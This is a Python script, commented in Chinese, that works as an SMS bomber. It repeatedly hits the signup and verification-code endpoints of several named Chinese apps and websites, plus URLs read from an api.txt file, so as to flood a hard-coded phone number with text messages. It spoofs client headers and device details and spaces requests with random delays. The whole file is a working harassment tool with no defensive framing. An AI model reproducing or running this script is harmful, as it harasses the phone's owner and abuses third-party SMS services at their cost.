import requests
import time
import random

# 目标手机号
phone = "16606669008"  # 替换为目标手机号
time_now = int(time.time() * 1000)
# 定义接口信息列表
apis = [
    {
        "desc": "小叶子app",
        "url": f"https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile={phone}&country_code=86",
        "method": "GET",
        "header": {},
        "data": {}
    },
    {
        "desc": "巨人网络",
        "url": f"https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=https%3A%2F%2Flogin.ztgame.com%2F&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone={phone}&mpcode=&pwd=&tname=&idcard=",
        "method": "GET",
        "header": {
            "Referer": "https://reg.ztgame.com/",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": {}
    },
    {
        "desc": "秘塔写作",
        "url": "https://xiezuocat.com/verify?type=signup",
        "method": "POST",
        "header": {},
        "data": {
            "phone": phone
        }
    },
    {
        "desc": "网心云APP",
        "url": "https://account-box.onethingpcs.com/xluser.core.login/v3/sendsms",
        "method": "POST",
        "header": {},
        "data": {
            "protocolVersion": "301",
            "sequenceNo": "1000001",
            "platformVersion": "10",
            "isCompressed": "0",
            "appid": "22017",
            "clientVersion": "3.15.1",
            "peerID": "00000000000000000000000000000000",
            "appName": "ANDROID-com.onethingcloud.android",
            "sdkVersion": "204500",
            "devicesign": "div101.095893e2bfa13a199f83691076c8bbb9ab0d01f75c929975048142c2fa38402b",
            "netWorkType": "WIFI",
            "providerName": "NONE",
            "deviceModel": "M2102J2SC",
            "deviceName": "Xiaomi M2102j2sc",
            "OSVersion": "11",
            "creditkey": "",
            "hl": "zh-CN",
            "mobile": phone,
            "register": "0"
        }
    },
]



# 从 api.txt 读取 URL，并添加到 apis 列表中
def load_apis_from_file():
    try:
        with open('api.txt', 'r') as file:
            for line in file:
                url = line.strip()

                # 检查 URL 中是否有 %s 占位符，如果没有则跳过
                if '%s' not in url:
                    print(f"警告: {url} 中没有占位符，已跳过")
                    continue  # 跳过当前的 URL，进入下一次循环

                # 检查占位符数量
                if url.count('%s') == 1:
                    # 使用 replace 仅替换 %s，确保不影响 URL 中的其他编码
                    formatted_url = url.replace('%s', phone)
                    apis.append({
                        "url": formatted_url,
                        "desc": "从 api.txt 加载的 API",
                        "method": "GET",
                        "data": {},  # GET 请求不需要 data
                        "header": {}
                    })
                    print(f"已添加 API: {formatted_url}")
                else:
                    print(f"警告: {url} 中的占位符数量不正确，已跳过")
    except FileNotFoundError:
        print("api.txt 文件未找到")




def send_sms(api):
    response = None  # 初始化 response 变量
    try:
        if api['method'].upper() == 'GET':
            response = requests.get(api['url'], headers=api.get('header', {}), params=api.get('data', {}))
        elif api['method'].upper() == 'POST':
            response = requests.post(api['url'], headers=api.get('header', {}), data=api.get('data', {}))

        # 打印请求状态
        if response and response.status_code == 200:
            print(f"{api['desc']} - 短信发送成功")
        else:
            print(f"{api['desc']} - 请求失败，状态码: {response.status_code if response else '无响应'}")
    except Exception as e:
        print(f"{api['desc']} - 请求出错: {e}")

def sms_bombing(count):
    print(f'size of apis {len(apis)}')
    for _ in range(count):
        for api in apis:
            send_sms(api)
            time.sleep(random.randint(1, 30))
        time.sleep(120)  # 每次发送后等待120秒，防止过于频繁

load_apis_from_file()

start_time = time.time()
sms_bombing(5)  # 对每个接口发送5次请求
end_time = time.time()

# 计算运行时间（秒）
elapsed_time = end_time - start_time

# 打印运行时间
print(f"程序运行时间: {elapsed_time:.4f} 秒")

